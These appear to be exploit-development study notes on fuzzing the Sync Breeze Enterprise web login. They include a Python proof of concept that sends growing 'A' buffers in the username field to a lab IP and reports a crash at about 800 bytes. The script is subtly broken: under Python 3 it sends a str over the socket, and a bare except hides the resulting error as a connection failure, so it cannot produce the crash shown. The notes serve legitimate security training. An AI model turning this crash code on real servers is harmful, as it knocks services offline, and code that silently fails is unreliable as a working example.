# Fuzzing

Fuzzing is a reverse engineering technique used to find places in the code where unhandled input can be provided, leading to an application crash or other behavior which can be further exploited.

## HTTP Fuzzing - SyncBreeze
## Gathering Input Data for a Seed

We open the Sync Breeze Enterprise server on our test machine and navigate to the Sync Breeze web portal:

![sync breeze portal](img/screen1.png)

We attempt to login using invalid credentials and capture the response in wireshark. We analyze the TCP stream and find our login request:

![login](img/screen2.png)
![req](img/screen3.png)

## First Fuzzer POC

The following Python script fuzzes the username parameter of the page by sending an increasingly large payload every iteration until it reaches 2000 bytes of lenght.

```
#!/usr/bin/python3
import socket
import time
import sys
size = 100

while(size < 2000):
    try:
        print("\nSending evil buffer with %s bytes" % size)
        inputBuffer = "A" * size
        content = "username=" + inputBuffer + "&password=A"
        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: 10.11.0.22\r\n"
        buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Referer: http://192.168.138.10/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: "+str(len(content))+"\r\n"
        buffer += "\r\n"
        buffer += content
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.11.0.22", 80))
        s.send(buffer)
        s.close()
        size += 100
        time.sleep(10)
    except:
        print("\nCould not connect!")
        sys.exit()
```

Running the script crashes the application at around 800 bytes:

![crash](img/screen5.png)

